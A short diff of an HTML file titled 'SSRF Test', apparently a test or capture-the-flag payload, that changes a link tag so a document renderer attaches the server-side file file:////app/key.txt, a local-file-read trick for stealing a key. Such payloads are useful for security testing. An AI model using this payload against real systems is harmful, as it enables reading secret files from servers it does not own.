@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
   <head>
-    <link rel="stylesheet" href="file:////app/key.txt">
+    <link rel="attachment" href="file:////app/key.txt">
   </head>
   <body>
     <h1>SSRF Test</h1>
